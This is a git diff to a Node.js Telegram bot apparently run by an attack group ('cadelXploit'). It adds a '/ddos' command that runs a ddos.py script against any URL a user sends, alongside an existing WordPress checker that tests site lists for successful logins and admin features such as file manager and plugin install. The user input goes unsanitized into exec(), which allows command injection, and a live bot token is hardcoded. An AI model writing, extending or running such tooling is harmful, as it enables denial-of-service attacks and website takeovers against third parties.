@@ -1,8 +1,11 @@
 const TelegramBot = require('node-telegram-bot-api');
 const { exec } = require('child_process');
 const fs = require('fs');
+const axios = require('axios');
 const token = '6674838409:AAHLkaUy93k648M8FlvlhBddJLD0NgfzYd0';
 const bot = new TelegramBot(token, { polling: true });
+
+let isDDOSRunning = false; // Variabel untuk menandai apakah serangan DDOS sedang berlangsung
 
 function sendProgressUpdate(chatId, messageId) {
     const progressFile = 'progress.txt';
@@ -38,6 +41,8 @@ bot.onText(/\/start/, (msg) => {
                     { text: 'Wordpress Checker', callback_data: 'wpcek' },
                 ],
                 [
+                    { text: 'DDOS Attack', callback_data: 'ddos' },
+                    { text: 'HTTP Checker', callback_data: 'http' },
                     { text: 'Owner', url: 'https://t.me/cadelXploit' }
                 ]
             ]
@@ -52,6 +57,12 @@ bot.on('callback_query', (query) => {
     switch (data) {
         case 'wpcek':
             bot.sendMessage(chatId, `WordPress Checker\n\nCommand: /wpcek\n\nDescription: Use this command to check WordPress sites for login success and specific features like WP File Manager, Plugin Install, Theme Editor, Add Page, and Add Article.\n\nPlease send the file with the list of WordPress sites.`);
+            break;
+        case 'ddos':
+            bot.sendMessage(chatId, `DDOS Attack\n\nCommand: /ddos <url>\n\nDescription: Use this command to perform a DDOS attack on the specified URL for a specified duration.\n\nExample: /ddos example.com 90`);
+            break;
+        case 'http':
+            bot.sendMessage(chatId, `HTTP Checker\n\nCommand: /http <url>\n\nDescription: Use this command to check HTTP status of a URL.\n\nPlease enter the URL to check HTTP status.`);
             break;
         default:
             break;
@@ -77,7 +88,7 @@ bot.onText(/\/wpcek/, (msg) => {
                 }
             }).then(sentMessage => {
                 const messageId = sentMessage.message_id;
-                
+
                 const intervalId = setInterval(() => {
                     sendProgressUpdate(chatId, messageId);
                 }, 5000); // Check progress every 5 seconds
@@ -128,6 +139,55 @@ bot.onText(/\/wpcek/, (msg) => {
             console.error(`Failed to write file: ${error.message}`);
         });
     });
+});
+
+bot.onText(/\/ddos (.+)/, (msg, match) => {
+    const chatId = msg.chat.id;
+    const url = match[1];
+    const duration = 90; // Default duration, you can change this as needed
+
+    if (isDDOSRunning) {
+        bot.sendMessage(chatId, `A DDOS attack is already in progress. Please wait until the current attack completes.`);
+        return;
+    }
+
+    isDDOSRunning = true; // Set DDOS status to running
+
+    bot.sendMessage(chatId, `Starting DDOS attack to ${url} for ${duration} seconds...`);
+
+    exec(`python3 ddos.py ${url} ${duration}`, (error, stdout, stderr) => {
+        isDDOSRunning = false; // Reset DDOS status
+
+        if (error) {
+            bot.sendMessage(chatId, `Error: ${error.message}`);
+            console.error(`Error: ${error.message}`);
+            return;
+        }
+        if (stderr) {
+            bot.sendMessage(chatId, `Stderr: ${stderr}`);
+            console.error(`Stderr: ${stderr}`);
+            return;
+        }
+
+        console.log(`Stdout: ${stdout}`);
+        bot.sendMessage(chatId, stdout); // Sending stdout to the user for debugging
+    });
+});
+
+bot.onText(/\/http (.+)/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const url = match[1];
+
+    try {
+        const response = await axios.get(`https://check-host.net/check-http?host=${url}`);
+        const checkHostUrl = `https://check-host.net/check-http?host=${url}`;
+
+        const message = `HTTP ${url}\n\n[Click here to check HTTP status](${checkHostUrl})`;
+        bot.sendMessage(chatId, message, { parse_mode: 'markdown' });
+    } catch (error) {
+        bot.sendMessage(chatId, `Error: ${error.message}`);
+        console.error(`Error: ${error.message}`);
+    }
 });
 
 bot.on('polling_error', (error) => console.log(`Polling Error: ${error.message}`));
